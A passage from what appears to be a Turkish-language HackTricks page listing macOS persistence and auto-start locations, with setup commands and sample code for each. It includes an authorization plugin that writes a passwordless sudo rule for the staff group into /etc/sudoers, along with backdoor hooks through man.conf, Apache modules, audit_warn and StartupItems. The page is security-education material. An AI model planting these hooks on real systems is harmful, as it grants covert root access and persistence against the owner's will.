system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Taşıyın** bundle'ı yükleneceği konuma:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Son olarak, bu Plugin'i yüklemek için **rule** ekleyin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`**, authorization framework'e **authorization için harici bir mechanism çağırması gerekeceğini** bildirir. Ayrıca **`privileged`**, bunun root tarafından çalıştırılmasını sağlar.

Şununla tetikleyin:
```bash
security authorize com.asdf.asdf
```
Ve **staff grubu sudo** erişimine sahip olmalıdır (doğrulamak için `/etc/sudoers` dosyasını okuyun).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Sandbox bypass için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve kullanıcının man kullanması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/private/etc/man.conf`**
- Root gerektirir
- **`/private/etc/man.conf`**: man her kullanıldığında

#### Açıklama ve Exploit

**`/private/etc/man.conf`** config dosyası, man documentation dosyalarını açarken kullanılacak binary/script'i belirtir. Bu nedenle executable yolu değiştirilebilir; böylece kullanıcı bazı dokümanları okumak için man kullandığında bir backdoor çalıştırılır.<sup>[31]</sup>

Örneğin **`/private/etc/man.conf`** içine şunu yazın:
```
MANPAGER /tmp/view
```
Ardından `/tmp/view` dosyasını şu şekilde oluşturun:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve apache'nin çalışıyor olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd entitlements'a sahip değil

#### Konum

- **`/etc/apache2/httpd.conf`**
- Root gerekir
- Tetikleyici: Apache2 başlatıldığında

#### Açıklama ve Exploit

`/etc/apache2/httpd.conf` içinde aşağıdaki gibi bir satır ekleyerek bir module yüklenmesini belirtebilirsiniz:<sup>[32]</sup>
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Bu şekilde derlenmiş modülünüz Apache tarafından yüklenecektir. Tek yapmanız gereken, ya **geçerli bir Apple sertifikasıyla imzalamak** ya da sistemde **yeni bir güvenilir sertifika ekleyip** modülü bununla **imzalamaktır**.

Ardından, gerekirse sunucunun başlatılacağından emin olmak için şunu çalıştırabilirsiniz:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb için kod örneği:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız, auditd'nin çalışıyor olması ve bir uyarıya neden olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/etc/security/audit_warn`**
- Root gerekir
- **Tetikleyici**: auditd bir uyarı algıladığında

#### Açıklama ve Exploit

auditd bir uyarı algıladığında **`/etc/security/audit_warn`** script'i **çalıştırılır**. Bu nedenle payload'unuzu buraya ekleyebilirsiniz.<sup>[33]</sup>
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n` ile bir uyarı verilmesini zorlayabilirsiniz.

### Başlangıç Öğeleri

> [!CAUTION] > **Bu kullanım dışıdır, bu nedenle bu dizinlerde hiçbir şey bulunmamalıdır.**

**StartupItem**, `/Library/StartupItems/` veya `/System/Library/StartupItems/` içinde bulunması gereken bir dizindir. Bu dizin oluşturulduktan sonra iki özel dosya içermelidir:

1. Bir **rc script'i**: Başlangıçta çalıştırılan bir shell script'i.
2. Özellikle `StartupParameters.plist` olarak adlandırılmış bir **plist dosyası**; bu dosya çeşitli yapılandırma ayarlarını içerir.

Başlangıç işleminin bunları tanıyıp kullanabilmesi için hem rc script'inin hem de `StartupParameters.plist` dosyasının **StartupItem** dizininin içine doğru şekilde yerleştirildiğinden emin olun.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Bu bileşeni macOS'umda bulamıyorum; daha fazla bilgi için writeup'a bakın

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Apple tarafından kullanıma sunulan **emond**, yeterince geliştirilmemiş veya muhtemelen terk edilmiş gibi görünen, ancak hâlâ erişilebilir olan bir logging mekanizmasıdır. Bir Mac yöneticisi için özellikle faydalı olmasa da bu belirsiz servis, threat actor'lar için çoğu macOS admin'i tarafından muhtemelen fark edilmeyecek, gizli bir persistence yöntemi olarak kullanılabilir.<sup>[34]</sup>

Varlığından haberdar olanlar için **emond**'un kötü amaçlı kullanımını tespit etmek oldukça kolaydır. Sistemin bu servise ait LaunchDaemon'u, tek bir dizinde çalıştırılacak script'leri arar. Bunu incelemek için aşağıdaki komut kullanılabilir:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Konum

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root gerekli
- **Tetikleyici**: XQuartz ile

#### Açıklama ve Exploit

XQuartz artık **macOS'ta yüklü olarak gelmiyor**, bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.<sup>[3]</sup>

### ~~kext~~

> [!CAUTION]
> Root olarak bile kext yüklemek o kadar karmaşıktır ki (bir exploit'iniz yoksa) bunu sandbox'lardan kaçış veya persistence için değerlendirmeyeceğim.

#### Konum

Bir KEXT'i startup item olarak yüklemek için **aşağıdaki konumlardan birine** yüklenmesi gerekir:

- `/System/Library/Extensions`
- OS X işletim sistemine yerleşik KEXT dosyaları.
- `/Library/Extensions`
- 3rd party software tarafından yüklenen KEXT dosyaları

Şu anda yüklü olan kext dosyalarını şu komutla listeleyebilirsiniz:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Daha fazla bilgi için [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Konum

- **`/usr/local/bin/amstoold`**
- Root gerekli

#### Açıklama ve Exploitation

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist`, bir XPC service sunarken bu binary'yi kullanıyordu... Sorun şu ki binary mevcut değildi; dolayısıyla buraya bir şey yerleştirebilir ve XPC service çağrıldığında binary'nizin çalıştırılmasını sağlayabilirdiniz.<sup>[35]</sup>

Bunu artık macOS'umda bulamıyorum.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Konum

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root gerekli
- **Trigger**: Service çalıştırıldığında (nadiren)

#### Açıklama ve exploit

Görünüşe göre bu script'i çalıştırmak pek yaygın değil ve macOS'umda bunu bile bulamadım; bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.<sup>[36]</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Bu, modern MacOS sürümlerinde çalışmıyor**

Buraya **startup sırasında çalıştırılacak komutlar** yerleştirmek de mümkündür. Normal bir rc.common script'i örneği:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence teknikleri ve araçları

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Referanslar

- [1] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [İyi ol' LaunchAgents'ın ötesinde - 1 - shell startup dosyaları](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [İyi ol' LaunchAgents'ın ötesinde - 18 - X11 ve XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [İyi ol' LaunchAgents'ın ötesinde - 21 - Yeniden açılan uygulamalar](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [İyi ol' LaunchAgents'ın ötesinde - 20 - Terminal tercihleri](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [İyi ol' LaunchAgents'ın ötesinde - 13 - Audio Plugin'leri](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plugin'leri (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [İyi ol' LaunchAgents'ın ötesinde - 12 - QuickLook Plugin'leri](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [İyi ol' LaunchAgents'ın ötesinde - 22 - LoginHook ve LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [İyi ol' LaunchAgents'ın ötesinde - 4 - cron işleri](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [İyi ol' LaunchAgents'ın ötesinde - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [İyi ol' LaunchAgents'ın ötesinde - 7 - xbar plugin'leri](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [İyi ol' LaunchAgents'ın ötesinde - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [İyi ol' LaunchAgents'ın ötesinde - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [İyi ol' LaunchAgents'ın ötesinde - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [İyi ol' LaunchAgents'ın ötesinde - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [İyi ol' LaunchAgents'ın ötesinde - 24 - Klasör Eylemleri](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS'ta Persistence için Klasör Eylemleri (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [İyi ol' LaunchAgents'ın ötesinde - 27 - Dock kısayolları](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [İyi ol' LaunchAgents'ın ötesinde - 17 - Renk Seçiciler](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [İyi ol' LaunchAgents'ın ötesinde - 26 - Finder Sync Plugin'leri](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener" Persistence'ını analiz etme (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [İyi ol' LaunchAgents'ın ötesinde - 16 - Ekran Koruyucu](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Erişiminizi koruma: macOS Persistence için ekran koruyucular (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [İyi ol' LaunchAgents'ın ötesinde - 11 - Spotlight Importer'ları](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [İyi ol' LaunchAgents'ın ötesinde - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [İyi ol' LaunchAgents'ın ötesinde - 19 - Periyodik Script'ler](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [İyi ol' LaunchAgents'ın ötesinde - 5 - Pluggable Authentication Module'leri (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [İyi ol' LaunchAgents'ın ötesinde - 28 - Authorization Plugin'leri](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Plugin'leri ile kalıcı kimlik bilgisi hırsızlığı (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [İyi ol' LaunchAgents'ın ötesinde - 30 - man yapılandırma dosyası - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [İyi ol' LaunchAgents'ın ötesinde - 25 - Apache2 modülleri](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [İyi ol' LaunchAgents'ın ötesinde - 31 - BSM audit framework'ü](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [İyi ol' LaunchAgents'ın ötesinde - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [İyi ol' LaunchAgents'ın ötesinde - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [İyi ol' LaunchAgents'ın ötesinde - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)

{{#include ../banners/hacktricks-training.md}}
